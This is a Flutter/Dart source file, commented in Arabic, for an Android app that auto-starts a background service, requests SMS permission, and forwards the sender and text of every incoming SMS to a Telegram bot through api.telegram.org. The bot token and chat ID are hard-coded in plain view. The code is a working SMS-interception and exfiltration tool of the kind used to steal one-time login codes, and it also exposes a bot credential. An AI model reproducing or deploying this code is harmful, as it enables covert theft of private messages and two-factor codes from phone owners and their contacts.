import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:easy_sms_receiver/easy_sms_receiver.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';

// ======================= الإعدادات =======================
const String botToken = '8506039606:AAE7T60AtsBw2dnA_avrzQIUoOSjEtTW-tc'; 
const String chatId = '7516606366';
// ========================================================

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeService();
  runApp(const MyApp());
}

// إعداد خدمة الخلفية
Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
    ),
    iosConfiguration: IosConfiguration(),
  );
}

// الدالة التي تعمل في الخلفية (يجب أن تكون خارج أي كلاس)
@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  // طلب إذن قراءة الرسائل (مرة واحدة عند بدء الخدمة)
  var status = await Permission.sms.status;
  if (!status.isGranted) {
    await Permission.sms.request();
  }

  final easySmsReceiver = EasySmsReceiver.instance;
  easySmsReceiver.listenIncomingSms(
    onNewMessage: (message) async {
      final sender = message.address ?? 'مرسل غير معروف';
      final body = message.body ?? 'لا يوجد نص';
      await _sendToTelegram(sender, body);
    },
  );
}

// دالة إرسال الرسالة إلى تليجرام
Future<void> _sendToTelegram(String sender, String body) async {
  final text = '📩 رسالة جديدة من: $sender\n\n$body';
  final url = Uri.parse(
    'https://api.telegram.org/bot$botToken/sendMessage'
    '?chat_id=$chatId&text=${Uri.encodeComponent(text)}',
  );
  try {
    await http.get(url);
  } catch (e) {
    // يمكنك تجاهل الخطأ أو تسجيله
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(title: const Text('ناقل الرسائل إلى تليجرام')),
        body: const Center(
          child: Padding(
            padding: EdgeInsets.all(20),
            child: Text(
              'التطبيق يعمل في الخلفية. أي رسالة SMS جديدة ستُرسل تلقائياً إلى بوت تليجرام المحدد.',
              textAlign: TextAlign.center,
            ),
          ),
        ),
      ),
    );
  }
}

